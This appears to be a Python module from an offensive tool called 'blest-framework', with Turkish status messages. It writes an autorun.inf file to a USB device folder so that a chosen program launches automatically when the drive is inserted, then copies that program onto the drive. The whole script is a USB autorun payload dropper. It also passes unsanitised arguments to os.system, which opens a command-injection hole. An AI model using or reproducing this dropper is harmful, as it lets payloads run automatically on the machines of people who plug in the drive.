import sys
import os
import colorama
import time
from colorama import Fore
if len(sys.argv) < 3:
    exit()

program = sys.argv[1]
program_path = sys.argv[2]
path = "/usr/share/blest-framework/devices/USB"

autorun_script = f'''
[autorun]
Open={program}
ShellExecute={program}
UseAutoPlay=1
'''
print(Fore.BLUE+'[i]'+Fore.RESET+' Cihazda "autorun.inf" dosyası oluşturuluyor...')
try:
    os.system('touch '+path+'/autorun.inf')
    with open(path+'/autorun.inf', 'w') as autorun:
        autorun.write(autorun_script)
    print(Fore.BLUE+'[i]'+Fore.RESET+f' Dosya Kopyalanıyor... [{program}]')
    time.sleep(1)
    os.system('cp -r '+program_path+' '+path)
except:
    pass
print(Fore.YELLOW+'[+]'+Fore.RESET+' Tamamlandı.')